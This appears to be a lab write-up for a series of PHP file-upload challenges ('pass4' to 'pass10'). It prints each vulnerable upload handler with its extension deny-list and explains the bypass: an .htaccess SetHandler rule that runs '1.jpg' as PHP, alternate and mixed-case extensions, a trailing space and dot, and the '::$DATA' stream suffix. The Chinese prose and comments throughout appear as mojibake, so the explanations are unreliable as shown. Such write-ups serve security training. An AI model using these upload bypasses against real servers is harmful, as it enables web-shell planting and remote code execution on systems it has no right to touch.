<p>åªç¦æ­¢äº†.asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨php3,php5,php7,phtmlç­‰ç­‰åç¼€åç»•è¿‡</p>
<p><img src="/2020/09/16/uploads/3.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>æ–‡ä»¶çš„ä½œç”¨</p>
<blockquote>
<ul>
<li>URLé‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢</li>
<li>MIMEç±»å‹é…ç½®</li>
<li>è®¿é—®æƒé™æ§åˆ¶ç­‰</li>
<li>ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨</li>
<li>å›¾ç‰‡é˜²ç›—é“¾</li>
<li>è‡ªå®šä¹‰404é”™è¯¯é¡µé¢</li>
<li>é˜»æ­¢/å…è®¸ç‰¹å®šIP/IPæ®µ</li>
<li>ç›®å½•æµè§ˆä¸ä¸»é¡µ</li>
<li>ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹</li>
<li>æ–‡ä»¶å¯†ç ä¿æŠ¤</li>
</ul>
</blockquote>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch "1.jpg"&gt;</span>
<span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre></div>

<p>è¿™å‡ å¥ä»£ç çš„æ„æ€ï¼š</p>
<p>é€šè¿‡.htaccessæ–‡ä»¶è°ƒç”¨phpè§£æå™¨å»è§£æä¸€ä¸ªæ–‡ä»¶åä¸­åªè¦åŒ…å«â€1.jpgâ€è¿™ä¸ªå­—ç¬¦ä¸²çš„ä»»æ„æ–‡ä»¶ï¼Œ</p>
<p>æ— è®ºæ‰©å±•åæ˜¯ä»€ä¹ˆ(æ²¡æœ‰ä¹Ÿè¡Œ)ï¼Œéƒ½ä»¥phpçš„æ–¹å¼æ¥è§£æ</p>
<p>ä¸Šä¼ å®Œ.htaccessæ–‡ä»¶åç›´æ¥ä¸Šä¼ ä¸€ä¸ª <code>1.jpg</code>å³å¯</p>
<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;
    &#125;
&#125;</code></pre></div>

<p>æœ¬é¢˜ä¸ç¬¬åé¢˜å®Œå…¨ä¸€æ ·ï¼Œè¯¦ç»†è§£ç­”è§ç¬¬åé¢˜</p>
<p><img src="/2020/09/16/uploads/5.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>

        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;
    &#125;
&#125;</code></pre></div>

<p>ä»”ç»†æŸ¥çœ‹æºç ä¼šå‘ç°å°‘äº†ä¸‹é¢çš„è¿™æ®µä»£ç </p>
<div class="hljs"><pre><code class="hljs php">$file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span></code></pre></div>

<p>è¿™é‡Œå°±å¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚å°†æ–‡ä»¶åç¼€åæ”¹ä¸º<code>.pHp , .PHP</code>ç­‰</p>
<p><img src="/2020/09/16/uploads/6.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/16/uploads/6-1.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>];
        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;
    &#125;
&#125;</code></pre></div>

<p>è·Ÿç¬¬å…­å…³å¯¹æ¯”å‘ç°å°‘äº†è¿™å¥è¯</p>
<div class="hljs"><pre><code>$file_ext = trim($file_ext); //é¦–å°¾å»ç©º</code></pre></div><p> <strong>åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ ç©ºæ ¼å’Œç‚¹ï¼Œå†™æˆ<code>1.php .</code>ï¼Œè¿™ä¸ªéœ€è¦ç”¨burpsuiteæŠ“åŒ…ä¿®æ”¹ï¼Œä¸Šä¼ åä¿å­˜åœ¨Windowsç³»ç»Ÿä¸Šçš„æ–‡ä»¶åæœ€åçš„ä¸€ä¸ª<code>.</code>ä¼šè¢«å»æ‰ï¼Œå®é™…ä¸Šä¿å­˜çš„æ–‡ä»¶åå°±æ˜¯1<code>.php</code></strong> </p>
<p><img src="/2020/09/16/uploads/7.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;
    &#125;
&#125;</code></pre></div>

<p>è¿™æ®µä»£ç å°‘äº†è¿™å¥è¯ï¼Œå¯ä»¥ä¸ç¬¬å…­å…³ç›¸åŒçš„åšæ³•</p>
<p><code>$file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</code></p>
<p><img src="/2020/09/16/uploads/8.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/09/16/uploads/8-1.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.date(<span class="hljs-string">"YmdHis"</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).$file_ext;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;
    &#125;
&#125;</code></pre></div>

<p>ä»”ç»†è§‚å¯Ÿå‘ç°å°‘äº†è¿™æ®µä»£ç </p>
<div class="hljs"><pre><code class="hljs php">$file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></code></pre></div>

<p> é‡‡ç”¨Windowsæ–‡ä»¶æµç‰¹æ€§ç»•è¿‡ </p>
<p>å°†æ–‡ä»¶åæ”¹ä¸º <code>1.php::$DATA</code>,ä½†æ˜¯å®è´¨ä¸Šä¿å­˜çš„æ–‡ä»¶è¿˜æ˜¯1.php</p>
<p><img src="/2020/09/16/uploads/9.png" srcset="/img/loading.gif" alt></p>
<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><div class="hljs"><pre><code class="hljs php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">'submit'</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        $deny_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">".php"</span>,<span class="hljs-string">".php5"</span>,<span class="hljs-string">".php4"</span>,<span class="hljs-string">".php3"</span>,<span class="hljs-string">".php2"</span>,<span class="hljs-string">".html"</span>,<span class="hljs-string">".htm"</span>,<span class="hljs-string">".phtml"</span>,<span class="hljs-string">".pht"</span>,<span class="hljs-string">".pHp"</span>,<span class="hljs-string">".pHp5"</span>,<span class="hljs-string">".pHp4"</span>,<span class="hljs-string">".pHp3"</span>,<span class="hljs-string">".pHp2"</span>,<span class="hljs-string">".Html"</span>,<span class="hljs-string">".Htm"</span>,<span class="hljs-string">".pHtml"</span>,<span class="hljs-string">".jsp"</span>,<span class="hljs-string">".jspa"</span>,<span class="hljs-string">".jspx"</span>,<span class="hljs-string">".jsw"</span>,<span class="hljs-string">".jsv"</span>,<span class="hljs-string">".jspf"</span>,<span class="hljs-string">".jtml"</span>,<span class="hljs-string">".jSp"</span>,<span class="hljs-string">".jSpx"</span>,<span class="hljs-string">".jSpa"</span>,<span class="hljs-string">".jSw"</span>,<span class="hljs-string">".jSv"</span>,<span class="hljs-string">".jSpf"</span>,<span class="hljs-string">".jHtml"</span>,<span class="hljs-string">".asp"</span>,<span class="hljs-string">".aspx"</span>,<span class="hljs-string">".asa"</span>,<span class="hljs-string">".asax"</span>,<span class="hljs-string">".ascx"</span>,<span class="hljs-string">".ashx"</span>,<span class="hljs-string">".asmx"</span>,<span class="hljs-string">".cer"</span>,<span class="hljs-string">".aSp"</span>,<span class="hljs-string">".aSpx"</span>,<span class="hljs-string">".aSa"</span>,<span class="hljs-string">".aSax"</span>,<span class="hljs-string">".aScx"</span>,<span class="hljs-string">".aShx"</span>,<span class="hljs-string">".aSmx"</span>,<span class="hljs-string">".cEr"</span>,<span class="hljs-string">".sWf"</span>,<span class="hljs-string">".swf"</span>,<span class="hljs-string">".htaccess"</span>,<span class="hljs-string">".ini"</span>);
        $file_name = trim($_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'name'</span>]);
        $file_name = deldot($file_name);<span class="hljs-comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span>
        $file_ext = strrchr($file_name, <span class="hljs-string">'.'</span>);
        $file_ext = strtolower($file_ext); <span class="hljs-comment">//è½¬æ¢ä¸ºå°å†™</span>
        $file_ext = str_ireplace(<span class="hljs-string">'::$DATA'</span>, <span class="hljs-string">''</span>, $file_ext);<span class="hljs-comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span>
        $file_ext = trim($file_ext); <span class="hljs-comment">//é¦–å°¾å»ç©º</span>
        
        <span class="hljs-keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;
            $temp_file = $_FILES[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            $img_path = UPLOAD_PATH.<span class="hljs-string">'/'</span>.$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;
                $is_upload = <span class="hljs-keyword">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                $msg = <span class="hljs-string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        $msg = UPLOAD_PATH . <span class="hljs-string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;
    &#125;
&#125;</code></pre></div>

